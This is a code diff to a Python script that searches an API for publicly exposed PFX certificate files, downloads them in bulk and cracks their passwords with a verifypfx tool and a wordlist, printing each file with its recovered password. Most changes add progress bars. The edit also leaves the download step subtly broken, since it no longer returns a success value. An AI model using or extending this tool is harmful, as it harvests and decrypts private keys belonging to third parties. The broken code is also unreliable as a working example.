@@ -6,6 +6,8 @@ import json
 import threading
 import subprocess
 from datetime import datetime
+from tqdm import tqdm
+import time
 
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives.serialization.pkcs12 import load_key_and_certificates
@@ -13,11 +15,14 @@ from cryptography.hazmat.primitives.serialization.pkcs12 import load_key_and_cer
 cracked_hashes = []
 verified_hashes = []
 
+limit = 10
+
+
 
 def run_verifypfx_on_file(filepath, verifypfx_path, common_roots_file):
-    print(f"Attempting to crack {filepath}.")
+    #print(f"Attempting to crack {filepath}.")
     result = subprocess.run([verifypfx_path, filepath, common_roots_file], stdout=subprocess.PIPE, text=True)
-    print(f"File {filepath} processed.")
+    #print(f"File {filepath} processed.")
     if result.stdout.strip():
         cracked_hashes.append((filepath, result.stdout.strip()))
 
@@ -25,26 +30,21 @@ def run_verifypfx_on_file(filepath, verifypfx_path, common_roots_file):
 
 
 def download_file(filename, url):
-	"""
-	Download an URL to a file
-	"""
-	#print("Downloading " + url + "\nSaving to\t" + filename)
-	
-	try:
-		with open(filename, 'wb') as fout:
-			response = requests.get(url, stream=True)
-			response.raise_for_status()
-			# Write response data to file
-			for block in response.iter_content(4096):
-				fout.write(block)
-		print("Downloaded: " + url)
-		
-		return True
+    global progress_bar
+    """Download an URL to a file"""
+    try:
+        with open(filename, 'wb') as fout:
+            response = requests.get(url, stream=True)
+            response.raise_for_status()
+            for block in response.iter_content(1024):
+                fout.write(block)
+        
+        # Update the global progress bar
+        
 
-	except Exception as e:
-		print(url + " failed download")
-		os.remove(filename)
-		return False
+    except requests.RequestException as e:
+        print(f"Error downloading {url}. Error: {e}")
+
 
 def hash_file(filename):
 	"""
@@ -75,7 +75,7 @@ class certApiSearch:
         self.api_key = api_key
         self.search_terms_dict = search_terms_dict
         self.search_defaults = {
-          "limit" : "1000",
+          "limit" : str(limit),
           "full-path" : "0"
         }
         self.get_query = self.BASE_URL + "?"
@@ -106,6 +106,7 @@ class certApiSearch:
                 }
                 catalogue.update(new_entry)
         print("Number of unique name certs = " + str(len(catalogue)))
+        
         return catalogue
 
 
@@ -204,7 +205,9 @@ def main():
     print("Search record limit = " + str(search['query']['limit']))
     print("Results found = " + str(search['meta']['results']))
 
-    catalogue = test.catalogue_search_for_download(search)
+    catalogue= test.catalogue_search_for_download(search)
+
+    progress_bar = tqdm(total=len(catalogue), desc="Downloading PFX files", position=0, leave=True)
 
     # Maintain a set to keep track of hashes
     all_hashes = set()
@@ -214,10 +217,9 @@ def main():
             all_hashes.add(file)
 
     for filename, url in catalogue.items():
-        print("Should I download: " + url)
         temp_filename = directory + filename
         download_result = download_file(temp_filename, url)
-        
+        progress_bar.update(1)
         if download_result:
             file_hash = hash_file(temp_filename)
             
@@ -231,11 +233,21 @@ def main():
                 new_filename = directory + file_hash
                 os.rename(temp_filename, new_filename)
                 print(f"Renamed {temp_filename} to {new_filename}")
+
+    progress_bar.close()
+    print("\nDownloading complete! Moving on to cracking. . .\n")
+    time.sleep(5)
+    
+    
+
     ### 
     ### CRACKING STAGE 
     ###
-    verifypfx_path = "./verifypfx.exe"
+    verifypfx_path = "./verifypfx"
     common_roots_file = "./common_roots.txt"
+
+
+    progress_bar_crack = tqdm(total=len(all_hashes), desc="Cracking PFX files (creating threads)", position=0, leave=True)
 
     # Start 2 threads
     threads = []
@@ -243,12 +255,18 @@ def main():
         thread = threading.Thread(target=run_verifypfx_on_file, args=(directory+hash_name, verifypfx_path, common_roots_file))
         threads.append(thread)
         thread.start()
+        progress_bar_crack.update(0.1)
+
+    progress_bar_crack.set_description("Cracking PFX files (all threads created, cracking...)")
 
     # Wait for all threads to finish
     for thread in threads:
         thread.join()
+        progress_bar_crack.update(0.9)
 
-    print(f"All tasks completed.\n\nCracked Hashes ({len(cracked_hashes)}):\n\tName\t\t\t\t\t\tPassword")
+    progress_bar_crack.close()
+
+    print(f"\n\nAll tasks completed!\n\nCracked Hashes ({len(cracked_hashes)}):\n\tName\tPassword")
     for item in cracked_hashes:
         print('\n', item[0], '\t', item[1])
     print('\n\n')
